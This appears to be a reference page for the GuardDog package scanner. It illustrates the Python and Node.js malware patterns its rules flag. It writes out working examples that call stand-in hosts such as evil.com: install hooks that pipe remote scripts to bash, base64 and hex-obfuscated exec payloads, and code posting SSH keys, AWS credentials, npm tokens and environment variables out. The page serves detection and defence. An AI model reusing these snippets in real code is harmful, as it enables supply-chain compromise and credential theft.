# Malicious Code Patterns Detected by GuardDog

This reference shows example malicious patterns that GuardDog's Semgrep rules detect in Python and Node.js code. Use these examples to understand what the scanner looks for.

## Python Patterns

### exec-base64: Base64-Encoded Code Execution

```python
# MALICIOUS: Decodes and executes hidden payload
import base64
exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCIp'))
```

### code-execution: Commands in setup.py

```python
# setup.py - MALICIOUS: Runs system command during install
from setuptools import setup
import os
os.system('curl http://evil.com/steal.py | python')

setup(name='fake-package')
```

### cmd-overwrite: Hijacked Install Command

```python
# setup.py - MALICIOUS: Custom install runs arbitrary code
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        import subprocess
        subprocess.call(['curl', 'http://attacker.com/payload.sh', '-o', '/tmp/p.sh'])
        subprocess.call(['bash', '/tmp/p.sh'])
        install.run(self)

setup(
    name='trojan-package',
    cmdclass={'install': PostInstall}
)
```

### exfiltrate-sensitive-data: Credential Theft

```python
# MALICIOUS: Steals SSH keys and sends to attacker
import os
import requests

ssh_key = open(os.path.expanduser('~/.ssh/id_rsa')).read()
aws_creds = open(os.path.expanduser('~/.aws/credentials')).read()

requests.post('http://evil.com/collect', data={
    'ssh': ssh_key,
    'aws': aws_creds,
    'hostname': os.uname().nodename
})
```

### download-executable: Remote Binary Download

```python
# MALICIOUS: Downloads and runs remote executable
import urllib.request
import os
import stat

urllib.request.urlretrieve('http://evil.com/malware', '/tmp/helper')
os.chmod('/tmp/helper', stat.S_IXUSR)
os.system('/tmp/helper')
```

### obfuscation: String Obfuscation Techniques

```python
# MALICIOUS: Obfuscated import and execution
__import__('\x6f\x73').system('\x63\x75\x72\x6c\x20\x68\x74\x74\x70...')

# MALICIOUS: Char code obfuscation
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115]))

# MALICIOUS: Reverse string
exec(')"nohtyp | hs.liave/moc.live//:ptth lruc"(metsys.so'[::-1])
```

### steganography: Hidden Data in Images

```python
# MALICIOUS: Extracts and runs code hidden in image
from PIL import Image
import requests

img_data = requests.get('http://evil.com/cat.png').content
# Extract hidden payload from image bytes
payload = extract_from_image(img_data)
exec(payload)
```

### clipboard-access: Clipboard Manipulation

```python
# MALICIOUS: Steals clipboard data (crypto addresses, passwords)
import pyperclip

clipboard_content = pyperclip.paste()
if clipboard_content.startswith('bc1'):  # Bitcoin address
    requests.post('http://evil.com/btc', data={'addr': clipboard_content})
```

### suspicious_passwd_access_linux: Password File Access

```python
# MALICIOUS: Reads system password file
with open('/etc/passwd', 'r') as f:
    passwd_data = f.read()
    requests.post('http://evil.com/harvest', data={'passwd': passwd_data})
```

---

## Node.js / JavaScript Patterns

### npm-exec-base64: Eval with Base64

```javascript
// MALICIOUS: Decodes and executes hidden code
const payload = Buffer.from('cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgaHR0cHM6Ly9ldmlsLmNvbS9zaGVsbC5zaCB8IGJhc2giKQ==', 'base64').toString();
eval(payload);
```

### npm-install-script: Malicious Install Scripts

```json
// package.json - MALICIOUS: Runs command on npm install
{
  "name": "trojan-package",
  "scripts": {
    "preinstall": "curl http://evil.com/steal.sh | bash",
    "postinstall": "node ./hidden-payload.js"
  }
}
```

### npm-serialize-environment: Environment Exfiltration

```javascript
// MALICIOUS: Steals all environment variables
const https = require('https');

const envData = JSON.stringify(process.env);
const req = https.request({
    hostname: 'evil.com',
    path: '/collect',
    method: 'POST'
}, () => {});

req.write(envData);  // Contains API keys, tokens, etc.
req.end();
```

### npm-exfiltrate-sensitive-data: Credential Theft

```javascript
// MALICIOUS: Steals SSH keys and npm tokens
const fs = require('fs');
const https = require('https');
const os = require('os');
const path = require('path');

const sshKey = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');
const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');

https.request({
    hostname: 'attacker.com',
    method: 'POST',
    path: '/exfil'
}, (res) => {}).end(JSON.stringify({ssh: sshKey, npm: npmrc}));
```

### npm-obfuscation: Obfuscated Code

```javascript
// MALICIOUS: Obfuscated require and exec
const _0x1234 = ['\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
require(_0x1234[0])['exec']('\x63\x75\x72\x6c\x20...');

// MALICIOUS: String concatenation obfuscation
const a = 'chi', b = 'ld_', c = 'pro', d = 'cess';
require(a+b+c+d).exec('curl http://evil.com | bash');
```

### npm-silent-process-execution: Silent Command Execution

```javascript
// MALICIOUS: Runs commands silently without output
const { execSync } = require('child_process');

execSync('curl http://evil.com/backdoor.sh | bash', {
    stdio: 'ignore',  // Suppress all output
    windowsHide: true // Hide window on Windows
});
```

### shady-links: Suspicious URLs

```javascript
// MALICIOUS: URLs with suspicious TLDs or patterns
fetch('http://download.evil.tk/payload.exe');
fetch('https://bit.ly/3xF4k3D');  // Shortened URLs hiding destination
fetch('http://192.168.1.100:4444/reverse');  // Raw IP addresses
```

---

## Metadata Red Flags

### Typosquatting Examples

| Legitimate | Malicious Typosquat |
|------------|---------------------|
| `requests` | `requets`, `request`, `reqeusts` |
| `numpy` | `numpyy`, `numpi`, `numy` |
| `lodash` | `lodahs`, `1odash`, `lodash-utils` |
| `express` | `expres`, `expresss`, `node-express` |

### Suspicious Package Metadata

- **Empty description**: No project description provided
- **Version 0.0.0**: Package never properly released
- **Disposable email**: maintainer@tempmail.com, author@guerrillamail.com
- **Unclaimed email domain**: maintainer@expired-domain.com
- **Repository mismatch**: Package files don't match linked GitHub repo

---

## Detection Tips

When GuardDog detects these patterns:

1. **Don't panic** - Some detections may be false positives
2. **Review the context** - Is the code in a test file or actual source?
3. **Check the source** - Is this from a trusted maintainer?
4. **Look for intent** - Legitimate tools may use similar patterns
5. **Report malicious packages** - Contact PyPI/npm security teams

## Safe Alternatives

Instead of these dangerous patterns, encourage:

```python
# SAFE: Use subprocess with explicit args (no shell injection)
import subprocess
subprocess.run(['ls', '-la'], capture_output=True, check=True)

# SAFE: Use pathlib for file operations
from pathlib import Path
config = Path.home() / '.config' / 'myapp' / 'settings.json'
```

```javascript
// SAFE: Use execFile instead of exec (no shell injection)
const { execFile } = require('child_process');
execFile('ls', ['-la'], (error, stdout) => console.log(stdout));

// SAFE: Use explicit dependencies instead of dynamic requires
const fs = require('fs');  // Not: require(userInput)
```
